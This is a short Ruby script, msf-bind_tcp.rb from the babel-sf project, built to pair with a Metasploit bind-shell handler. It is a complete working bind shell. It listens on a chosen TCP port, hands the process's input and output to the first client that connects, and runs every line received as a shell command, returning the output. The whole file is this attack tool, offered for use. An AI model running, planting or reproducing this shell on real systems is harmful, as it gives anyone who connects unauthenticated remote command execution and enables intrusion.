#!/usr/bin/ruby
#
# msf-bind_tcp.rb version 0.1
#
# babel-sf ( https://github.com/attackdebris/babel-sf )
#

require 'socket'

port_number = ARGV[0]

time = Time.now.strftime("%Y-%m-%d %H:%M")

if ARGV.empty? or ARGV[0] == "-h" or ARGV[0] == "--h" or ARGV[0] == "-help" or ARGV[0] == "--help"
    puts "msf-bind_tcp.rb ( https://github.com/attackdebris/babel-sf )"
    puts "\r\n[This script should be utilised with a ruby/shell_bind_tcp msf handler payload]"
    puts "\r\n"
    puts "Usage:"
    puts "ruby msf-bind_tcp.rb [bind port]"
    puts "e.g. ruby msf-bind_tcp.rb 4444"
elsif ARGV.length != 1
    puts "msf-reverse_tcp.rb ( https://github.com/attackdebris/babel-sf )"
    puts "\r\nError, only 1 argument is required, check your syntax"
else
  puts "Starting msf-bind_tcp.rb ( https://github.com/attackdebris/babel-sf ) at #{time}"
  puts "Listening on TCP port #{port_number}...."
  s=TCPServer.new(port_number);
  c=s.accept;s.close;
  $stdin.reopen(c);
  $stdout.reopen(c);
  $stderr.reopen(c);
  $stdin.each_line{|l|l=l.strip;next if l.length==0;(IO.popen(l,"rb"){|fd| fd.each_line {|o| c.puts(o.strip) }}) rescue nil }
end